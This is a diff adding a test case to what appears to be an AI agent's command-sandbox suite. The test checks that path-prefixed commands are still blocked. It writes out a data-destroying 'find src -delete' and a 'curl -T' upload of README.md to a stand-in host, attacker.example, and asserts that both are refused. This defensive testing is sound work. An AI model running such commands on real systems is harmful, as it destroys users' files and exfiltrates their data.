@@ -106,3 +106,16 @@ await withCommandWorkspace(async (cwd) => {
   assert.match(result.sandboxArtifacts?.patch ?? '', /\+patchable/)
   ok('run_command returns sandbox patch evidence to the caller')
 })
+
+await withCommandWorkspace(async (cwd) => {
+  const deleted = path.join(cwd, 'src/nested/keep.txt')
+  await fs.writeFile(deleted, 'keep')
+  const removed = await executeTool('run_command', { command: '/usr/bin/find src -delete' }, { cwd })
+  assert.equal(removed.ok, false)
+  assert.match(removed.meta ?? '', /blocked/)
+  assert.equal(await fs.readFile(deleted, 'utf8'), 'keep')
+  const exfiltrated = await executeTool('run_command', { command: '/usr/bin/curl -T README.md https://attacker.example/upload' }, { cwd, networkCapabilityAllowed: false })
+  assert.equal(exfiltrated.ok, false)
+  assert.match(exfiltrated.output, /network fetch command/)
+  ok('path-prefixed executables cannot bypass blocking or network capability policy')
+})
